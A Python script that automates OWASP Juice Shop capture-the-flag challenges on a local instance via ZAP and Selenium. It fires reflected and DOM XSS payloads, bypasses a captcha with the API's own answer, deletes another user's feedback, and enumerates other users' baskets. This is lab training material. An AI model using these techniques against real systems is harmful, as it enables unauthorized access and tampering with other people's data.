import os
import os.path
import platform
from zapv2 import ZAPv2
import requests
import json
from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType
import time


def get_browser():
  # @todo add windows path
  if platform.system() == "Darwin":
    os.environ["webdriver.chrome.driver"] = os.path.expanduser("~") + '/Library/Application Support/ZAP/webdriver/macos/64/chromedriver'
  else:
    os.environ["webdriver.chrome.driver"] = os.path.expanduser("~") + '/.ZAP/webdriver/linux/64/chromedriver'

  proxy = Proxy()
  proxy.proxy_type = ProxyType.MANUAL
  proxy.http_proxy = "127.0.0.1:8080"
  proxy.socks_proxy = "127.0.0.1:8080"
  proxy.ssl_proxy = "127.0.0.1:8080"

  capabilities = webdriver.DesiredCapabilities.CHROME
  proxy.add_to_capabilities(capabilities)

  options = webdriver.ChromeOptions()
  options.add_argument('--ignore-certificate-errors')
  options.add_argument("--test-type")
  return webdriver.Chrome(executable_path=os.environ["webdriver.chrome.driver"], chrome_options=options, desired_capabilities=capabilities)


def challenge_score_board(browser):
  browser.get('%s/#/score-board' % target)
  time.sleep(1)


def challenge_administration(browser):
  browser.get('%s/#/administration' % target)
  time.sleep(1)


def challenge_dom_xss(browser):
  browser.get('%s/#/search?q=<script>alert("XSS")</script>' % target)
  time.sleep(1)


def challenge_reflected_xss(browser):
  browser.get('%s/#/track-result?id=<script>alert("XSS")</script>' % target)
  time.sleep(1)


zap = ZAPv2()
browser = get_browser()
email = "test@test.com"
password = "testtest"
target = 'http://localhost:3000'

# Setup requests with default settings
session = requests.Session()
session.verify = False
session.headers = {
  'Content-Type': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'
}
session.proxies = zap._ZAPv2__proxies

# Access score board
challenge_score_board(browser)

# Access Admin
challenge_administration(browser)

# Reflected XSS
challenge_reflected_xss(browser)

# DOM XSS
challenge_dom_xss(browser)

browser.quit()

# Register
payload = {
  "email": email,
  "password": password,
  "passwordRepeat": password,
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2018-11-07T21:19:32.395Z",
    "updatedAt":"2018-11-07T21:19:32.395Z"
  },
  "securityAnswer": password
}
response = session.post("%s/api/Users/" % target, data=json.dumps(payload))

try:
  print(response.json())
except Exception as err:
  print(err)
  pass

# Login and capture token
payload = {"email": email, "password": password}
response = session.post("%s/rest/user/login" % target, data=json.dumps(payload))
data = {}

try:
  data = response.json()
except Exception as err:
  print("Login time")
  print(err)
  print(response.text)
  exit()
  
token = data['authentication']['token']
session.headers['Authorization'] =  'Bearer ' + token

# Get captcha for giving feedback then post feedback of 0
captcha = session.get("%s/rest/captcha/" % target).json()
data = session.post("%s/api/Feedbacks/" % target,  data=json.dumps({
  "comment": "Comment?",
  "rating": 0,
  "captcha": captcha["answer"],
  "captchaId": captcha["captchaId"]
})).json()
print(data)

# Delete 5-star feedback
print(session.delete("%s/api/Feedbacks/1" % target).text)

# Access someone elses bucket
for i in range(1, 20):
  zap.urlopen("%s/rest/basket/%s" % (target, i))

print("")
print("[!] Challenges")
data = session.get("%s/api/Challenges/" % target).json()
solved = [c for c in data['data'] if c['solved']]
print("Completed %s" % len(solved))
for s in solved:
  print(" - " + s['name'])